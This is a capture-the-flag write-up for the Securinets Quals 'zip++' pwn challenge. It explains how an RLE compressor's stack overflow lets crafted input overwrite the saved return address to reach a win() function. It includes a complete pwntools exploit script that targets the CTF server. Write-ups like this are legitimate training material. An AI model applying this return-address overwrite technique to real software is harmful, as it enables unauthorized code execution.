# zip++ - Securinets Quals

**Category:** Pwn  



## Background
We're given a binary that compresses input using Run-Length Encoding (RLE). The challenge contains a `win()` function that reads `flag.txt`, and our goal is to exploit a buffer overflow to redirect execution to this function.

Running the binary normally, we see that the binary writes compressed bytes as `(byte)(count)` pairs. 

``` Bash
$ echo "aaaaaaaaaaaaaaa" | ./main
data to compress :
compressed data : 610F0A01
```

### Initial Recon
Running a checksec on the binary for intial recon:
``` Bash
$ checksec ./main
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
No PIE and no stack canary so binary overflow is possible without a leak. Next we check the strings of the binary and find that there something calls `system("cat flag.txt")`. Doing an `objdump`, we find that there is a function called `win()`, which is what we are trying to jump to. 

Now, disassembling the vulnerable function `vuln()`,  we find if the compressed output written into `[rbp-0x310]` exceeds the compressed buffer area and continues upward, it will reach and overwrite saved RBP and the saved return address at `[rbp+8]`.

This gives us the overall exploit idea:



1. Use a raw input that, when compressed, fills the compressed buffer and causes the (value,count) pairs to overflow into the saved return address ([rbp+8]).

2. Choose the raw input so the compressed bytes that land in [rbp+8] become the low bytes of the win address.

To return to `win (0x00000000004011a5)` we only need to control the low bytes of the saved RIP in memory. In little-endian that target is `a5 11 40 00 00 00 00 00`, so we must cause the compressed output to contain `a5 11` at the saved-RIP location. So if we send the raw byte 0xa5 repeated 0x11 (17) times the compressor will produce a5 11.

To align that (a5,11) pair with `[rbp+8]` we pad it with an offset. The compressed buffer occupies 784 bytes (rbp-0x310) and the saved RIP sits 8 bytes beyond it, so 792 compressed bytes land exactly at `[rbp+8]`. Using `gdb`, we find that sending `'ab'` 198 times gets us to `[rbp+8]`.

Running the exploit with this caused a crash due to stack alignment issues. To fix this, we can us `win + 1` which is `0x4011a6` and avoid misalignment issues on the return. 

## Solution
```Python
from pwn import *

exe = ELF('./main')
context.log_level = 'info'

# local or remote
# p = process('./main')
p = remote('pwn-14caf623.p1.securinets.tn', 9000)

# Use win+1 for stack alignment
win_addr = exe.symbols['win']
log.info(f"win at: {hex(win_addr)}")
target_addr = win_addr + 1         # 0x4011a6
win_bytes = p64(target_addr)       # little-endian
byte0 = win_bytes[0]               # 0xa6
byte1 = win_bytes[1]               # 0x11

count = byte1
assert 1 <= count <= 255

# Padding
payload = b'AB' * 197 + b'AB'     # 396 bytes

# Overflow
payload += bytes([byte0]) * count  # e.g. b'\xa6' * 17 -> compressed as: a6 11

# Stage 1: send payload to overwrite saved RIP
p.recvuntil(b'data to compress : ')
p.send(payload)                     # NO newline

# read loop prompt and then trigger the return path
p.recvuntil(b'data to compress : ')
p.sendline(b'exit')                 


p.interactive()
```



